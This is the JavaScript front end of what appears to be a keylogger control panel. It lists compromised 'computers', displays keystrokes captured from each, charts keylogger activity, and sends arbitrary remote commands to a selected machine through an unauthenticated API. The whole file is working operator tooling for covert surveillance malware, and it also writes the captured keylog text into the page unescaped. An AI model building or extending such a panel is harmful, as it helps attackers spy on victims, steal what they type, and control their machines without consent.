// API Configuration
let API_URL = 'http://127.0.0.1:5000/api';

// Sidebar & Sections
const sidebarLinks = document.querySelectorAll('.nav a');
const sections = document.querySelectorAll('.section');

// Computers / Details
const computersContainer = document.getElementById('computers-container');
const computerDetailsSection = document.getElementById('computer-details');
const closeDetailsBtn = document.getElementById('close-details');
const detailName = document.getElementById('detail-name');
const detailId = document.getElementById('detail-id');
const detailIp = document.getElementById('detail-ip');
const keylogData = document.getElementById('keylog-data');
const systemInfo = document.getElementById('system-info');
const searchInput = document.getElementById('search-input');

// Modal: Send Command
const controlComputerBtn = document.getElementById('control-computer-btn');
const controlComputerModal = document.getElementById('control-computer-modal');
const sendCommandForm = document.getElementById('send-command-form');
const commandInput = document.getElementById('command-input');

// Modal: Add Computer
const addComputerBtn = document.getElementById('add-computer-btn');
const addComputerModal = document.getElementById('add-computer-modal');
const addComputerForm = document.getElementById('add-computer-form');
const newComputerNameInput = document.getElementById('new-computer-name');
const newComputerIpInput = document.getElementById('new-computer-ip');

// Close buttons (modals)
const modalCloseButtons = document.querySelectorAll('.modal-close, .modal-cancel');

// Dashboard
const totalComputersElem = document.getElementById('total-computers');
const activeKeyloggersElem = document.getElementById('active-keyloggers');
const lastCommandElem = document.getElementById('last-command');
let activityChart = null;

// Settings
const apiUrlInput = document.getElementById('api-url');
const authTokenInput = document.getElementById('auth-token');
const saveSettingsBtn = document.getElementById('save-settings-btn');

// Global Keylog
const globalLogContainer = document.getElementById('global-log-container');

// State
let currentComputerId = null;
let computersData = [];

// On Load
document.addEventListener('DOMContentLoaded', () => {
  initNavLinks();
  fetchComputers();
  setupEventListeners();
  initDashboardChart();
});

// Navigation
function initNavLinks() {
  sidebarLinks.forEach(link => {
    link.addEventListener('click', event => {
      event.preventDefault();
      const sectionToShow = link.getAttribute('data-section');

      sections.forEach(s => s.classList.remove('active'));
      sidebarLinks.forEach(l => l.classList.remove('active'));

      document.getElementById(`${sectionToShow}-section`).classList.add('active');
      link.classList.add('active');
    });
  });
}

// Events
function setupEventListeners() {
  closeDetailsBtn.addEventListener('click', () => {
    computerDetailsSection.classList.add('hidden');
  });

  controlComputerBtn.addEventListener('click', () => openModal(controlComputerModal));

  addComputerBtn.addEventListener('click', () => openModal(addComputerModal));
  addComputerForm.addEventListener('submit', handleAddComputer);

  // Close modals
  modalCloseButtons.forEach(button => {
    button.addEventListener('click', event => {
      const modal = event.target.closest('.modal-overlay');
      closeModal(modal);
    });
  });

  // Command form
  sendCommandForm.addEventListener('submit', handleSendCommand);

  // Search
  searchInput.addEventListener('input', handleSearch);

  // Settings
  saveSettingsBtn.addEventListener('click', handleSaveSettings);
}

// Fetch Data
async function fetchComputers() {
  try {
    const response = await fetch(`${API_URL}/computers`);
    const computers = await response.json();
    computersData = computers;

    // Update dashboard
    totalComputersElem.textContent = computers.length;
    const activeCount = computers.filter(c => c.keylogger_active).length;
    activeKeyloggersElem.textContent = activeCount;

    renderComputersList(computers);
    updateGlobalLog(computers);
    updateActivityChart(computers);
  } catch (error) {
    console.error('Error fetching computers:', error);
  }
}

async function fetchComputerDetails(computerId) {
  try {
    const response = await fetch(`${API_URL}/computers/${computerId}`);
    const computer = await response.json();

    if (response.ok) {
      renderComputerDetails(computer);
      currentComputerId = computerId;
    } else {
      console.error('Error fetching computer details');
    }
  } catch (error) {
    console.error('Error fetching computer details:', error);
  }
}

async function sendCommandToComputer(computerId, command) {
  try {
    const response = await fetch(`${API_URL}/computers/${computerId}/command`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
        // 'Authorization': 'Bearer ' + authTokenInput.value
      },
      body: JSON.stringify({ command })
    });

    if (response.ok) {
      console.log('Command sent successfully');
      lastCommandElem.textContent = command;
    } else {
      console.error('Error sending command');
    }
  } catch (error) {
    console.error('Error sending command:', error);
  }
}

// Add new computer (POST)
async function addComputer(name, ip) {
  try {
    const response = await fetch(`${API_URL}/computers`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
        // 'Authorization': 'Bearer ' + authTokenInput.value
      },
      body: JSON.stringify({ name, ip })
    });

    if (!response.ok) {
      throw new Error('Failed to add new computer');
    }
    return await response.json(); 
  } catch (error) {
    console.error('Error adding computer:', error);
    throw error;
  }
}

// Rendering
function renderComputersList(computers) {
  computersContainer.innerHTML = '';

  if (computers.length === 0) {
    const msg = document.createElement('p');
    msg.textContent = 'No computers found';
    msg.style.textAlign = 'center';
    computersContainer.appendChild(msg);
    return;
  }

  computers.forEach(computer => {
    const li = document.createElement('li');
    li.className = 'computer-item';
    li.innerHTML = `
      <div class="computer-name">${computer.name} (${computer.ip})</div>
    `;
    li.addEventListener('click', () => {
      computerDetailsSection.classList.remove('hidden');
      fetchComputerDetails(computer.id);
    });
    computersContainer.appendChild(li);
  });
}

function renderComputerDetails(computer) {
  detailName.textContent = computer.name || 'N/A';
  detailId.textContent = computer.id || 'N/A';
  detailIp.textContent = computer.ip || 'N/A';
  keylogData.textContent = computer.keylog || 'No keylog data';
  systemInfo.textContent = computer.system_info || 'No system info';
}

// Search
function handleSearch(e) {
  const searchTerm = e.target.value.toLowerCase();
  const computerItems = computersContainer.querySelectorAll('.computer-item');

  computerItems.forEach(item => {
    const text = item.textContent.toLowerCase();
    item.style.display = text.includes(searchTerm) ? '' : 'none';
  });
}

// Modal
function openModal(modal) {
  modal.classList.remove('hidden');
}
function closeModal(modal) {
  modal.classList.add('hidden');
}

// Command Form
async function handleSendCommand(event) {
  event.preventDefault();
  const command = commandInput.value;

  if (!currentComputerId) {
    console.error('No computer selected');
    return;
  }

  await sendCommandToComputer(currentComputerId, command);
  closeModal(controlComputerModal);
  sendCommandForm.reset();
}

// Add Computer Form
async function handleAddComputer(event) {
  event.preventDefault();
  const name = newComputerNameInput.value.trim();
  const ip = newComputerIpInput.value.trim();

  if (!name || !ip) {
    console.error('Missing name or IP');
    return;
  }

  try {
    const newComp = await addComputer(name, ip);
    console.log('New computer added:', newComp);

    closeModal(addComputerModal);
    addComputerForm.reset();

    fetchComputers();
  } catch (error) {
    console.error('Failed to add new computer:', error);
  }
}

// Settings
function handleSaveSettings() {
  if (apiUrlInput.value) {
    API_URL = apiUrlInput.value;
  }
  console.log('Settings saved. Current API:', API_URL);
}

// Global Keylog
function updateGlobalLog(computers) {
  if (!globalLogContainer) return;
  globalLogContainer.innerHTML = '';

  computers.forEach(comp => {
    const block = document.createElement('div');
    block.style.border = '1px solid #333';
    block.style.margin = '10px 0';
    block.style.padding = '10px';
    block.innerHTML = `
      <strong>${comp.name}:</strong><br/>
      <em>${comp.keylog || 'No data...'}</em>
    `;
    globalLogContainer.appendChild(block);
  });
}

// Chart
function initDashboardChart() {
  const ctx = document.getElementById('activityChart');
  if (!ctx) return;

  activityChart = new Chart(ctx, {
    type: 'bar',
    data: {
      labels: [],
      datasets: [
        {
          label: 'Keylogger Activity',
          data: [],
          backgroundColor: '#ff1744',
        },
      ],
    },
    options: {
      responsive: true,
      scales: {
        y: { beginAtZero: true }
      },
    },
  });
}

function updateActivityChart(computers) {
  if (!activityChart) return;
  const labels = computers.map(c => c.name);
  const data = computers.map(c => c.keyCount || 0);

  activityChart.data.labels = labels;
  activityChart.data.datasets[0].data = data;
  activityChart.update();
}
